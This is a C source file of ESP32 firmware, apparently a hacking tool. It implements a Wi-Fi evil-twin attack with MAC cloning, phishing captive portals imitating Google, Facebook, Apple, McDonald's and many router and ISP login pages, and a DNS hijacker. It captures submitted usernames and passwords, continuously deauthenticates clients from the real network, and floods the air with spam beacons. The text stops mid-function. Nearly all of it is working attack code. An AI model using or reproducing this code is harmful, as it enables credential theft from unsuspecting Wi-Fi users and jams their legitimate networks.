/*
 * htool_wifi.c - EVIL TWIN FIXED + MAC CLONING SUPPORT
 * Fixed for ESP-IDF v4.3 (Removed esp_mac.h)
 */
#include <string.h>
#include "htool_wifi.h"
#include "esp_err.h"
#include "esp_wifi_types.h"
#include "htool_display.h"
#include "htool_api.h"
#include "freertos/FreeRTOS.h"
#include "freertos/task.h"
#include "esp_system.h" // esp_base_mac_addr_set is here in IDF 4.x
#include "lwip/sockets.h"
#include "lwip/err.h"
#include "esp_netif.h"
#include "htool_nvsm.h"
#include "lwip/sys.h"
#include "lwip/netdb.h"
#include "esp_http_server.h"
#include "esp_log.h" 

#define TAG "htool_wifi"

// --- Externs ---
extern const char html_google_start[] asm("_binary_google_html_start");
extern const char html_google_end[]   asm("_binary_google_html_end");
extern const char html_mcdonalds_start[] asm("_binary_mcdonalds_html_start");
extern const char html_mcdonalds_end[]   asm("_binary_mcdonalds_html_end");
extern const char html_facebook_start[] asm("_binary_facebook_html_start");
extern const char html_facebook_end[]   asm("_binary_facebook_html_end");
extern const char html_apple_start[] asm("_binary_apple_html_start");
extern const char html_apple_end[]   asm("_binary_apple_html_end");
extern const char html_router_start[] asm("_binary_router_html_start");
extern const char html_router_end[]   asm("_binary_router_html_end");
extern const char html_1_1_start[] asm("_binary_1_1_html_start");
extern const char html_1_1_end[]   asm("_binary_1_1_html_end");
extern const char html_a1_start[] asm("_binary_a1_html_start");
extern const char html_a1_end[]   asm("_binary_a1_html_end");
extern const char html_asus_start[] asm("_binary_asus_html_start");
extern const char html_asus_end[]   asm("_binary_asus_html_end");
extern const char html_att_start[] asm("_binary_att_html_start");
extern const char html_att_end[]   asm("_binary_att_html_end");
extern const char html_fritzbox_start[] asm("_binary_fritzbox_html_start");
extern const char html_fritzbox_end[]   asm("_binary_fritzbox_html_end");
extern const char html_globe_start[] asm("_binary_globe_html_start");
extern const char html_globe_end[]   asm("_binary_globe_html_end");
extern const char html_huawei_start[] asm("_binary_huawei_html_start");
extern const char html_huawei_end[]   asm("_binary_huawei_html_end");
extern const char html_magenta_start[] asm("_binary_magenta_html_start");
extern const char html_magenta_end[]   asm("_binary_magenta_html_end");
extern const char html_netgear_start[] asm("_binary_netgear_html_start");
extern const char html_netgear_end[]   asm("_binary_netgear_html_end");
extern const char html_o2_start[] asm("_binary_o2_html_start");
extern const char html_o2_end[]   asm("_binary_o2_html_end");
extern const char html_pldt_start[] asm("_binary_pldt_html_start");
extern const char html_pldt_end[]   asm("_binary_pldt_html_end");
extern const char html_swisscom_start[] asm("_binary_swisscom_html_start");
extern const char html_swisscom_end[]   asm("_binary_swisscom_html_end");
extern const char html_tplink_start[] asm("_binary_tplink_html_start");
extern const char html_tplink_end[]   asm("_binary_tplink_html_end");
extern const char html_verizon_start[] asm("_binary_verizon_html_start");
extern const char html_verizon_end[]   asm("_binary_verizon_html_end");
extern const char html_vodafone_start[] asm("_binary_vodafone_html_start");
extern const char html_vodafone_end[]   asm("_binary_vodafone_html_end");

const int WIFI_SCAN_FINISHED_BIT = BIT0;
const int WIFI_CONNECTED = BIT1;
const int WIFI_DISCONNECTED = BIT2;

static TaskHandle_t htask;
htool_wifi_client_t *wifi_client = NULL;
wifi_ap_record_t *global_scans;
wifi_config_t *wifi_config = NULL;

// --- Static Handles for Interfaces ---
static esp_netif_t *netif_ap = NULL;
static esp_netif_t *netif_sta = NULL;

uint16_t global_scans_num = 32;

// --- Global Vars (Volatile for UI Sync) ---
uint8_t global_scans_count = 0;
uint8_t menu_cnt = 0;
volatile bool scan_started = false;

uint8_t channel;
uint8_t beacon_ssid_index = 0;
bool perform_active_scan = false;
bool perform_passive_scan = false;
bool scan_manually_stopped = false;

#define MAX_USER_LEN 120
#define MAX_PW_LEN 64
static char cred_user[MAX_USER_LEN];
static char cred_pw[MAX_PW_LEN];
static uint32_t cred_pw_len = 0;
static uint32_t cred_user_len = 0;

const char funny_ssids[24][32] = {"Two Girls One Router", "I'm Watching You", "Mom Use This One", "Martin Router King", "Never Gonna Give You Up", "VIRUS.EXE", "All Your Bandwidth Belong to Us", "Byte Me", "Never Gonna Give You Wifi", "The Password is...",
                            "Girls Gone Wireless", "Vladimir Routin", "Try Me", "Definitely Not Wi-Fi", "Click and Die", "Connecting...", "Use at your own risk", "99 problems but Wi-Fi Aint One", "FreeVirus", "You are hacked!", "Next time lock your router",
                            "For Porn Use Only", "You Pay Now", "I can read your emails"};

captive_portal_task_args_t captive_portal_task_args;
beacon_task_args_t beacon_task_args;

#define DNS_PORT (53)
#define DNS_MAX_LEN (256)
#define OPCODE_MASK (0x7800)
#define QR_FLAG (1 << 7)
#define QD_TYPE_A (0x0001)
#define ANS_TTL_SEC (300)

extern int ieee80211_raw_frame_sanity_check(int32_t arg, int32_t arg2, int32_t arg3) { 
    return 0;
}

typedef struct __attribute__((__packed__)) {
    uint16_t id; uint16_t flags; uint16_t qd_count; uint16_t an_count; uint16_t ns_count; uint16_t ar_count;
} dns_header_t;

typedef struct { uint16_t type; uint16_t class; } dns_question_t;

typedef struct __attribute__((__packed__)) {
    uint16_t ptr_offset; uint16_t type; uint16_t class; uint32_t ttl; uint16_t addr_len; uint32_t ip_addr;
} dns_answer_t;

volatile bool cp_running = false;
volatile bool target_connected = false;

typedef struct sockaddr_in sockaddr_in_t;
httpd_handle_t server;
int sock = 0;

void htool_wifi_reset_creds() { cred_user_len = 0; cred_pw_len = 0; }
char *htool_wifi_get_pw_cred() { return cred_pw; }
char *htool_wifi_get_user_cred() { return cred_user; }
uint32_t htool_wifi_get_pw_cred_len() { return cred_pw_len; }
uint32_t htool_wifi_get_user_cred_len() { return cred_user_len; }

// --- Helper: Chunked HTML Sender ---
static esp_err_t send_chunked_html(httpd_req_t *req, const char *start, size_t len) {
    const size_t chunk_size = 1024; // Send 1KB at a time
    size_t remaining = len;
    const char *ptr = start;

    while (remaining > 0) {
        size_t to_send = (remaining > chunk_size) ? chunk_size : remaining;
        if (httpd_resp_send_chunk(req, ptr, to_send) != ESP_OK) return ESP_FAIL;
        ptr += to_send;
        remaining -= to_send;
    }
    return httpd_resp_send_chunk(req, NULL, 0);
}

esp_err_t common_get_handler(httpd_req_t *req) {
    uint32_t len = 0;
    const char *start = NULL; 

    // --- Original IF-ELSE Template Logic ---
    if (captive_portal_task_args.is_evil_twin) {
        if (captive_portal_task_args.cp_index == 0) { len = html_router_end - html_router_start; start = html_router_start; }
        else if (captive_portal_task_args.cp_index == 1) { len = html_huawei_end - html_huawei_start; start = html_huawei_start; }
        else if (captive_portal_task_args.cp_index == 2) { len = html_asus_end - html_asus_start; start = html_asus_start; }
        else if (captive_portal_task_args.cp_index == 3) { len = html_tplink_end - html_tplink_start; start = html_tplink_start; }
        else if (captive_portal_task_args.cp_index == 4) { len = html_netgear_end - html_netgear_start; start = html_netgear_start; }
        else if (captive_portal_task_args.cp_index == 5) { len = html_o2_end - html_o2_start; start = html_o2_start; }
        else if (captive_portal_task_args.cp_index == 6) { len = html_fritzbox_end - html_fritzbox_start; start = html_fritzbox_start; }
        else if (captive_portal_task_args.cp_index == 7) { len = html_vodafone_end - html_vodafone_start; start = html_vodafone_start; }
        else if (captive_portal_task_args.cp_index == 8) { len = html_magenta_end - html_magenta_start; start = html_magenta_start; }
        else if (captive_portal_task_args.cp_index == 9) { len = html_1_1_end - html_1_1_start; start = html_1_1_start; }
        else if (captive_portal_task_args.cp_index == 10) { len = html_a1_end - html_a1_start; start = html_a1_start; }
        else if (captive_portal_task_args.cp_index == 11) { len = html_globe_end - html_globe_start; start = html_globe_start; }
        else if (captive_portal_task_args.cp_index == 12) { len = html_pldt_end - html_pldt_start; start = html_pldt_start; }
        else if (captive_portal_task_args.cp_index == 13) { len = html_att_end - html_att_start; start = html_att_start; }
        else if (captive_portal_task_args.cp_index == 14) { len = html_swisscom_end - html_swisscom_start; start = html_swisscom_start; }
        else if (captive_portal_task_args.cp_index == 15) { len = html_verizon_end - html_verizon_start; start = html_verizon_start; }
    } else {
        if (captive_portal_task_args.cp_index == 0) { len = html_google_end - html_google_start; start = html_google_start; }
        else if (captive_portal_task_args.cp_index == 1) { len = html_mcdonalds_end - html_mcdonalds_start; start = html_mcdonalds_start; }
        else if (captive_portal_task_args.cp_index == 2) { len = html_facebook_end - html_facebook_start; start = html_facebook_start; }
        else if (captive_portal_task_args.cp_index == 3) { len = html_apple_end - html_apple_start; start = html_apple_start; }
    }

    size_t req_hdr_host_len = httpd_req_get_hdr_value_len(req, "Host");
    char req_hdr_host_value[req_hdr_host_len + 1];
    httpd_req_get_hdr_value_str(req, "Host", (char*)&req_hdr_host_value, req_hdr_host_len + 1);

    // FIX: Redirect to 192.168.4.1
    if (strncmp(req_hdr_host_value, "connectivitycheck.gstatic.com", strlen("connectivitycheck.gstatic.com")) == 0) {
        httpd_resp_set_status(req, "302 Found");
        httpd_resp_set_hdr(req, "Location", "http://192.168.4.1");
        httpd_resp_send(req, NULL, 0);
        return ESP_OK;
    }

    // --- FIX: CREDENTIAL PARSING & SUCCESS PAGE ---
    size_t buf_len = httpd_req_get_url_query_len(req) + 1;
    if (buf_len > 1) {
        char *buf = malloc(buf_len);
        if (buf) {
            if (httpd_req_get_url_query_str(req, buf, buf_len) == ESP_OK) {
                ESP_LOGI(TAG, "Credentials captured: %s", buf);
                
                // 1. Parse 'user=' (match HTML name)
                char *usr_ptr = strstr(buf, "user="); 
                if(usr_ptr) { 
                   strncpy(cred_user, usr_ptr + 5, MAX_USER_LEN);
                   char* end = strchr(cred_user, '&');
                   if(end) *end = 0;
                   cred_user_len = strlen(cred_user); 
                }
                
                // 2. Parse 'pass=' (match HTML name)
                char *pw_ptr = strstr(buf, "pass=");
                if(pw_ptr) { 
                    strncpy(cred_pw, pw_ptr + 5, MAX_PW_LEN);
                    char* end = strchr(cred_pw, '&');
                    if(end) *end = 0;
                    cred_pw_len = strlen(cred_pw); 
                }

                // 3. Send Success Page Immediately
                const char* success_html = "<html><head><meta name='viewport' content='width=device-width, initial-scale=1.0'></head><body><h2 style='text-align:center; margin-top:50px;'>Connection Successful!</h2><p style='text-align:center;'>You are now connected.</p></body></html>";
                httpd_resp_set_type(req, "text/html");
                httpd_resp_send(req, success_html, strlen(success_html));
                free(buf);
                return ESP_OK;
            }
            free(buf);
        }
    }

    httpd_resp_set_type(req, "text/html");
    // Use Chunked Sender for large files
    if (start != NULL) return send_chunked_html(req, start, len);
    return httpd_resp_send(req, NULL, 0);
}

httpd_uri_t embedded_html_uri = { .uri = "/*", .method = HTTP_GET, .handler = common_get_handler };

int htool_wifi_start_httpd_server() {
    httpd_config_t config = HTTPD_DEFAULT_CONFIG();
    config.uri_match_fn = httpd_uri_match_wildcard;
    config.max_open_sockets = 4;
    config.lru_purge_enable = true;
    config.stack_size = 8192; 
    if ((httpd_start(&server, &config) != ESP_OK)) return HTOOL_ERR_GENERAL;
    httpd_register_uri_handler(server, &embedded_html_uri);
    return HTOOL_OK;
}

void httpd_server_task() {
    htool_wifi_start_httpd_server();
    while (cp_running) {
        while (cp_running && !target_connected && captive_portal_task_args.is_evil_twin) {
            htool_wifi_send_deauth_frame(captive_portal_task_args.ssid_index, false);
            htool_wifi_send_disassociate_frame(captive_portal_task_args.ssid_index, false);
            vTaskDelay(pdMS_TO_TICKS(500)); 
        }
        vTaskDelay(pdMS_TO_TICKS(100));
    }
    vTaskDelete(NULL);
}

// DNS Server
static char *parse_dns_name(char *raw_name, char *parsed_name, size_t parsed_name_max_len) {
    char *label = raw_name;
    char *name_itr = parsed_name;
    int name_len = 0;
    do {
        int sub_name_len = *label;
        name_len += (sub_name_len + 1);
        if (name_len > parsed_name_max_len) return NULL;
        memcpy(name_itr, label + 1, sub_name_len);
        name_itr[sub_name_len] = '.';
        name_itr += (sub_name_len + 1);
        label += sub_name_len + 1;
    } while (*label != 0);
    parsed_name[name_len - 1] = '\0';
    return label + 1;
}

static int parse_dns_request(char *req, size_t req_len, char *dns_reply, size_t dns_reply_max_len) {
    if (req_len > dns_reply_max_len) return -1;
    memset(dns_reply, 0, dns_reply_max_len);
    memcpy(dns_reply, req, req_len);
    dns_header_t *header = (dns_header_t *)dns_reply;
    if ((header->flags & OPCODE_MASK) != 0) return 0;
    header->flags |= QR_FLAG;
    uint16_t qd_count = ntohs(header->qd_count);
    header->an_count = htons(qd_count);
    int reply_len = qd_count * sizeof(dns_answer_t) + req_len;
    if (reply_len > dns_reply_max_len) return -1;
    char *cur_ans_ptr = dns_reply + req_len;
    char *cur_qd_ptr = dns_reply + sizeof(dns_header_t);
    char name[128];

    for (int i = 0; i < qd_count; i++) {
        char *name_end_ptr = parse_dns_name(cur_qd_ptr, name, sizeof(name));
        if (name_end_ptr == NULL) return -1;
        dns_question_t *question = (dns_question_t *)(name_end_ptr);
        uint16_t qd_type = ntohs(question->type);
        if (qd_type == QD_TYPE_A) {
            dns_answer_t *answer = (dns_answer_t *)cur_ans_ptr;
            answer->ptr_offset = htons(0xC000 | (cur_qd_ptr - dns_reply));
            answer->type = htons(qd_type);
            answer->class = htons(ntohs(question->class));
            answer->ttl = htonl(ANS_TTL_SEC);
            esp_netif_ip_info_t ip_info;
            
            // FIX: Use netif_ap to get IP
            if (netif_ap) {
                esp_netif_get_ip_info(netif_ap, &ip_info);
                answer->addr_len = htons(sizeof(ip_info.ip.addr));
                answer->ip_addr = ip_info.ip.addr;
            }
        }
    }
    return reply_len;
}

void dns_server_task(void *pvParameters) {
    char rx_buffer[128];
    char addr_str[128];
    int addr_family;
    int ip_protocol;
    while (cp_running) {
        sockaddr_in_t dest_addr;
        dest_addr.sin_addr.s_addr = htonl(INADDR_ANY);
        dest_addr.sin_family = AF_INET;
        dest_addr.sin_port = htons(DNS_PORT);
        addr_family = AF_INET; ip_protocol = IPPROTO_IP;
        inet_ntoa_r(dest_addr.sin_addr, addr_str, sizeof(addr_str) - 1);
        sock = socket(addr_family, SOCK_DGRAM, ip_protocol);
        if (sock < 0) break;
        bind(sock, (struct sockaddr *)&dest_addr, sizeof(dest_addr));
        while (cp_running) {
            struct sockaddr_in6 source_addr;
            socklen_t socklen = sizeof(source_addr);
            int len = recvfrom(sock, rx_buffer, sizeof(rx_buffer) - 1, 0, (struct sockaddr *)&source_addr, &socklen);
            if (len < 0) { if (cp_running == false) goto exit; close(sock); break; } 
            else {
                rx_buffer[len] = 0;
                char reply[DNS_MAX_LEN];
                int reply_len = parse_dns_request(rx_buffer, len, reply, DNS_MAX_LEN);
                if (reply_len > 0) sendto(sock, reply, reply_len, 0, (struct sockaddr *)&source_addr, sizeof(source_addr));
            }
        }
    }
    exit: shutdown(sock, 0); close(sock); vTaskDelete(NULL);
}

void htool_wifi_dns_start() {
    xTaskCreatePinnedToCore(dns_server_task, "dns_task", 4096, NULL, 5, NULL, 0);
}

void wifi_event_handler(void* arg, esp_event_base_t event_base, int32_t event_id, void* event_data) {
    if (event_base == WIFI_EVENT && event_id == WIFI_EVENT_AP_STACONNECTED) target_connected = true;
    else if (event_base == WIFI_EVENT && event_id == WIFI_EVENT_AP_STADISCONNECTED) target_connected = false;
}

void htool_wifi_captive_portal_start(void *pvParameters) {
    esp_event_handler_instance_register(WIFI_EVENT, ESP_EVENT_ANY_ID, &wifi_event_handler, NULL, NULL);
    esp_wifi_stop();
    wifi_config_t wifi_config = {0};
    if (captive_portal_task_args.is_evil_twin) {
        memcpy(wifi_config.ap.ssid, global_scans[captive_portal_task_args.ssid_index].ssid, sizeof(global_scans[captive_portal_task_args.ssid_index].ssid));
        wifi_config.ap.ssid_len = strlen((char *)wifi_config.ap.ssid);
        wifi_config.ap.channel = global_scans[captive_portal_task_args.ssid_index].primary;
        wifi_config.ap.authmode = WIFI_AUTH_OPEN;
        wifi_config.ap.max_connection = 4;
        
        // --- NEW: MAC Cloning Logic ---
        if (captive_portal_task_args.clone_mac) {
             esp_base_mac_addr_set(global_scans[captive_portal_task_args.ssid_index].bssid);
        }
    }
    else {
        if (captive_portal_task_args.cp_index == 0) strcpy((char *)wifi_config.ap.ssid, "Google Free WiFi Test");
        else if (captive_portal_task_args.cp_index == 1) strcpy((char *)wifi_config.ap.ssid, "McDonald's Free WiFi");
        else if (captive_portal_task_args.cp_index == 2) strcpy((char *)wifi_config.ap.ssid, "Facebook Free WiFi");
        else if (captive_portal_task_args.cp_index == 3) strcpy((char *)wifi_config.ap.ssid, "Apple Shop Free WiFi");
        wifi_config.ap.ssid_len = strlen((char *)wifi_config.ap.ssid);
        wifi_config.ap.channel = 0;
        wifi_config.ap.authmode = WIFI_AUTH_OPEN;
        wifi_config.ap.max_connection = 4;
   }

    // --- FIX: DHCP & IP Force Restart ---
    esp_netif_ip_info_t ip_info;
    IP4_ADDR(&ip_info.ip, 192, 168, 4, 1);
    IP4_ADDR(&ip_info.gw, 192, 168, 4, 1);
    IP4_ADDR(&ip_info.netmask, 255, 255, 255, 0);
    if (netif_ap) {
        esp_netif_dhcps_stop(netif_ap);
        esp_netif_set_ip_info(netif_ap, &ip_info);
        esp_netif_dhcps_start(netif_ap);
    }

    ESP_ERROR_CHECK(esp_wifi_set_mode(WIFI_MODE_AP));
    ESP_ERROR_CHECK(esp_wifi_set_config(ESP_IF_WIFI_AP, &wifi_config));
    target_connected = false;
    cp_running = true;
    esp_wifi_start();
    htool_wifi_dns_start();
    xTaskCreatePinnedToCore(httpd_server_task, "http_server", 8192, NULL, 5, NULL, 0); 
}

void htool_wifi_captive_portal_stop() {
    httpd_unregister_uri_handler(server, "/*", 1);
    httpd_stop(server);
    cp_running = false; 
    shutdown(sock, 0);
    close(sock);
    target_connected = false;
    htool_set_wifi_sta_config(); 
}

// --- Beacon/Deauth/Scan (Unchanged) ---
uint8_t beacon_packet[57] = { 0x80, 0x00, 0x00, 0x00, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0xc0, 0x6c, 0x83, 0x51, 0xf7, 0x8f, 0x0f, 0x00, 0x00, 0x00, 0x32, 0x00, 0x01, 0x04, 0x00 };
static uint8_t deauth_packet[26] = { 0xc0, 0x00, 0x3a, 0x01, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xf0, 0xff, 0x02, 0x00 };
char beacon_random[] = "1234567890qwertzuiopasdfghjklyxcvbnm QWERTZUIOPASDFGHJKLYXCVBNM_";

void send_random_beacon_frame() {
    channel = esp_random() % 13 + 1;
    esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
    beacon_packet[10] = beacon_packet[16] = esp_random() % 256;
    beacon_packet[11] = beacon_packet[17] = esp_random() % 256;
    beacon_packet[12] = beacon_packet[18] = esp_random() % 256;
    beacon_packet[13] = beacon_packet[19] = esp_random() % 256;
    beacon_packet[14] = beacon_packet[20] = esp_random() % 256;
    beacon_packet[15] = beacon_packet[21] = esp_random() % 256;
    beacon_packet[37] = 6;
    beacon_packet[38] = beacon_random[esp_random() % 65];
    beacon_packet[39] = beacon_random[esp_random() % 65];
    beacon_packet[40] = beacon_random[esp_random() % 65];
    beacon_packet[41] = beacon_random[esp_random() % 65];
    beacon_packet[42] = beacon_random[esp_random() % 65];
    beacon_packet[43] = beacon_random[esp_random() % 65];
    beacon_packet[56] = channel;
    uint8_t postSSID[13] = {0x01, 0x08, 0x82, 0x84, 0x8b, 0x96, 0x24, 0x30, 0x48, 0x6c, 0x03, 0x01, 0x04 };
    for (uint8_t i = 0; i < 12; i++) beacon_packet[38 + 6 + i] = postSSID[i];
    esp_wifi_80211_tx(WIFI_IF_STA, beacon_packet, sizeof(beacon_packet), false);
    esp_wifi_80211_tx(WIFI_IF_STA, beacon_packet, sizeof(beacon_packet), false);
    esp_wifi_80211_tx(WIFI_IF_STA, beacon_packet, sizeof(beacon_packet), false);
}
void send_router_beacon_frame_random_mac(uint8_t ssid_index) {
    if(!global_scans || ssid_index >= global_scans_count) return;
    esp_wifi_set_channel(global_scans[ssid_index].primary, global_scans[ssid_index].second);
    beacon_packet[10] = beacon_packet[16] = esp_random() % 256;
    beacon_packet[11] = beacon_packet[17] = esp_random() % 256;
    beacon_packet[12] = beacon_packet[18] = esp_random() % 256;
    beacon_packet[13] = beacon_packet[19] = esp_random() % 256;
    beacon_packet[14] = beacon_packet[20] = esp_random() % 256;
    beacon_packet[15] = beacon_packet[21] = esp_random() % 256;
    beacon_packet[37] = strlen((const char*) global_scans[ssid_index].ssid);
    for (uint8_t i = 0; i < beacon_packet[37]; i++) beacon_packet[38 + i] = global_scans[ssid_index].ssid[i];
    beacon_packet[56] = global_scans[ssid_index].primary;
    uint8_t postSSID[13] = {0x01, 0x08, 0x82, 0x84, 0x8b, 0x96, 0x24, 0x30, 0x48, 0x6c, 0x03, 0x01, 0x04 };
    for (uint8_t i = 0; i < 12; i++) beacon_packet[38 + beacon_packet[37] + i] = postSSID[i];
    esp_wifi_80211_tx(WIFI_IF_STA, beacon_packet, sizeof(beacon_packet), false);
}
void send_router_beacon_frame_same_mac(uint8_t ssid_index) {
    if(!global_scans || ssid_index >= global_scans_count) return;
    esp_wifi_set_channel(global_scans[ssid_index].primary, global_scans[ssid_index].second);
    beacon_packet[10] = beacon_packet[16] = global_scans[ssid_index].bssid[0];
    beacon_packet[11] = beacon_packet[17] = global_scans[ssid_index].bssid[1];
    beacon_packet[12] = beacon_packet[18] = global_scans[ssid_index].bssid[2];
    beacon_packet[13] = beacon_packet[19] = global_scans[ssid_index].bssid[3];
    beacon_packet[14] = beacon_packet[20] = global_scans[ssid_index].bssid[4];
    beacon_packet[15] = beacon_packet[21] = global_scans[ssid_index].bssid[5];
    beacon_packet[37] = strlen((const char*) global_scans[ssid_index].ssid);
    for (uint8_t i = 0; i < beacon_packet[37]; i++) beacon_packet[38 + i] = global_scans[ssid_index].ssid[i];
    beacon_packet[56] = global_scans[ssid_index].primary;
    uint8_t postSSID[13] = {0x01, 0x08, 0x82, 0x84, 0x8b, 0x96, 0x24, 0x30, 0x48, 0x6c, 0x03, 0x01, 0x04 };
    for (uint8_t i = 0; i < 12; i++) beacon_packet[38 + beacon_packet[37] + i] = postSSID[i];
    esp_wifi_80211_tx(WIFI_IF_STA, beacon_packet, sizeof(beacon_packet), false);
}
void send_funny_beacon_frame() {
    channel = esp_random() % 13 + 1;
    esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
    beacon_packet[10] = beacon_packet[16] = esp_random() % 256;
    beacon_packet[11] = beacon_packet[17] = esp_random() % 256;
    beacon_packet[12] = beacon_packet[18] = esp_random() % 256;
    beacon_packet[13] = beacon_packet[19] = esp_random() % 256;
    beacon_packet[14] = beacon_packet[20] = esp_random() % 256;
    beacon_packet[15] = beacon_packet[21] = esp_random() % 256;
    beacon_ssid_index = esp_random() % 24;
    beacon_packet[37] = strlen(funny_ssids[beacon_ssid_index]);
    for (uint8_t i = 0; i < beacon_packet[37]; i++) beacon_packet[38 + i] = funny_ssids[beacon_ssid_index][i];
    beacon_packet[56] = global_scans[menu_cnt].primary;
    uint8_t postSSID[13] = {0x01, 0x08, 0x82, 0x84, 0x8b, 0x96, 0x24, 0x30, 0x48, 0x6c, 0x03, 0x01, 0x04 };
    for (uint8_t i = 0; i < 12; i++) beacon_packet[38 + beacon_packet[37] + i] = postSSID[i];
    esp_wifi_80211_tx(WIFI_IF_STA, beacon_packet, sizeof(beacon_packet), false);
}
void beacon_spammer() {
    uint8_t ssid_index = 0;
    while (htool_api_is_beacon_spammer_running()) {
        if (beacon_task_args.beacon_index == 0) send_random_beacon_frame();
        else if (beacon_task_args.beacon_index == 1) {
            if (menu_cnt == global_scans_count) {
                ssid_index++; if (ssid_index == global_scans_count) ssid_index = 0;
                send_router_beacon_frame_random_mac(ssid_index);
            } else send_router_beacon_frame_random_mac(menu_cnt);
        }
        else if (beacon_task_args.beacon_index == 2) {
            if (menu_cnt == global_scans_count) {
                send_router_beacon_frame_same_mac(menu_cnt);
                ssid_index++; if (ssid_index == global_scans_count) ssid_index = 0;
            } else send_router_beacon_frame_same_mac(menu_cnt);
        }
        else if (beacon_task_args.beacon_index == 3) send_funny_beacon_frame();
        vTaskDelay(pdMS_TO_TICKS(10));
    }
    vTaskDelete(NULL);
}
void htool_wifi_start_beacon_spammer() {
    if (perform_passive_scan || perform_active_scan) {
        ESP_LOGI(TAG, "Scan in progress, stop the scan");
        scan_manually_stopped = true;
        esp_wifi_scan_stop();
        scan_started = false;
    }
    xTaskCreatePinnedToCore(beacon_spammer, "beacon_spammer", 4096, NULL, 1, NULL, 0);
}
void htool_wifi_send_disassociate_frame(uint8_t num, bool sta) {
    if (esp_wifi_set_channel(global_scans[num].primary, global_scans[num].second) != ESP_OK) target_connected = true;
    deauth_packet[10] = deauth_packet[16] = global_scans[num].bssid[0];
    deauth_packet[11] = deauth_packet[17] = global_scans[num].bssid[1];
    deauth_packet[12] = deauth_packet[18] = global_scans[num].bssid[2];
    deauth_packet[13] = deauth_packet[19] = global_scans[num].bssid[3];
    deauth_packet[14] = deauth_packet[20] = global_scans[num].bssid[4];
    deauth_packet[15] = deauth_packet[21] = global_scans[num].bssid[5];
    deauth_packet[0] = 0xA0; // Disassoc
    if (!sta) {
        esp_wifi_80211_tx(WIFI_IF_AP, deauth_packet, sizeof(deauth_packet), false);
        esp_wifi_80211_tx(WIFI_IF_AP, deauth_packet, sizeof(deauth_packet), false);
    } else {
        esp_wifi_80211_tx(WIFI_IF_STA, deauth_packet, sizeof(deauth_packet), false);
        esp_wifi_80211_tx(WIFI_IF_STA, deauth_packet, sizeof(deauth_packet), false);
    }
}
void htool_wifi_send_deauth_frame(uint8_t num, bool sta) {
    if (esp_wifi_set_channel(global_scans[num].primary, global_scans[num].second) != ESP_OK) target_connected = true;
    deauth_packet[10] = deauth_packet[16] = global_scans[num].bssid[0];
    deauth_packet[11] = deauth_packet[17] = global_scans[num].bssid[1];
    deauth_packet[12] = deauth_packet[18] = global_scans[num].bssid[2];
    deauth_packet[13] = deauth_packet[19] = global_scans[num].bssid[3];
    deauth_packet[14] = deauth_packet[20] = global_scans[num].bssid[4];
    deauth_packet[15] = deauth_packet[21] = global_scans[num].bssid[5];
    deauth_packet[0] = 0xC0; // Deauth
    if (!sta) {
        esp_wifi_80211_tx(WIFI_IF_AP, deauth_packet, sizeof(deauth_packet), false);
        esp_wifi_80211_tx(WIFI_IF_AP, deauth_packet, sizeof(deauth_packet), false);
    } else {
        esp_wifi_80211_tx(WIFI_IF_STA, deauth_packet, sizeof(deauth_packet), false);
        esp_wifi_80211_tx(WIFI_IF_STA, deauth_packet, sizeof(deauth_packet), false);
    }
}
void htool_send_deauth_all() {
    for (uint8_t i = 0; i < global_scans_count; i++) htool_wifi_send_deauth_frame(i, true);
}
void deauther_task() {
    while (htool_api_is_deauther_running()) {
        if (menu_cnt != global_scans_count) htool_wifi_send_deauth_frame(menu_cnt, true);
        else htool_send_deauth_all();
        vTaskDelay(pdMS_TO_TICKS(10));
    }
    vTaskDelete(NULL);
}
void htool_wifi_start_deauth() {
    if (perform_passive_scan || perform_active_scan) {
        ESP_LOGI(TAG, "Scan in progress, stop the scan");
        scan_manually_stopped = true;
        esp_wifi_scan_stop();
        scan_started = false;
    }
    xTaskCreatePinnedToCore(deauther_task, "deauth", 1024, NULL, 1, NULL, 0);
}
void htool_wifi_start_active_scan() { perform_active_scan = true; }
void htool_wifi_start_passive_scan() { perform_passive_scan = true; }

// --- PATCH: SCAN + MESH LOGIC ---
static void wifi_handling_task(void *pvParameters) {
    wifi_scan_config_t scan_conf;
    EventBits_t uxBits;
    if ((global_scans = calloc(32, sizeof(wifi_ap_record_t))) == NULL) { ESP_LOGE(TAG, "Error no more free Memory"); vTaskDelete(NULL); }
    if ((wifi_config = calloc(1, sizeof(wifi_config_t))) == NULL) { ESP_LOGE(TAG, "Error no more free Memory"); vTaskDelete(NULL); }
    while (true) {
        while (perform_active_scan) {
            ESP_LOGI(TAG, "Starting Active Scan...");
            scan_started = true; global_scans_count = 0;
            scan_conf.scan_type = WIFI_SCAN_TYPE_ACTIVE;
            scan_conf.show_hidden = true;
            scan_conf.scan_time.active.min = 50; scan_conf.scan_time.active.max = 100;
            if (esp_wifi_scan_start(&scan_conf, false) != ESP_OK) {
                ESP_LOGE(TAG, "Error at wifi_scan_start"); htool_set_wifi_sta_config();
            }
            xEventGroupClearBits(wifi_client->status_bits, WIFI_SCAN_FINISHED_BIT);
            uxBits = xEventGroupWaitBits(wifi_client->status_bits, WIFI_SCAN_FINISHED_BIT, pdTRUE, pdFALSE, pdMS_TO_TICKS(4000));
            if ((uxBits & WIFI_SCAN_FINISHED_BIT) != 0) {
                if (scan_manually_stopped) {
                    scan_manually_stopped = false; perform_active_scan = false; scan_started = false; break;
                }
                esp_wifi_scan_get_ap_records(&global_scans_num, global_scans);
                global_scans_count = global_scans_num; global_scans_num = 32;
                perform_active_scan = false; scan_started = false; 
            } else {
                perform_active_scan = false; scan_started = false; ESP_LOGE(TAG, "Scan timeout");
            }
        }
        while (perform_passive_scan) {
            ESP_LOGI(TAG, "Starting Passive Scan...");
            scan_started = true; global_scans_count = 0;
            scan_conf.scan_type = WIFI_SCAN_TYPE_PASSIVE;
            scan_conf.show_hidden = true;
            scan_conf.scan_time.passive = 520;
            if (esp_wifi_scan_start(&scan_conf, false) != ESP_OK) {
                ESP_LOGE(TAG, "Error at wifi_scan_start"); htool_set_wifi_sta_config();
            }
            xEventGroupClearBits(wifi_client->status_bits, WIFI_SCAN_FINISHED_BIT);
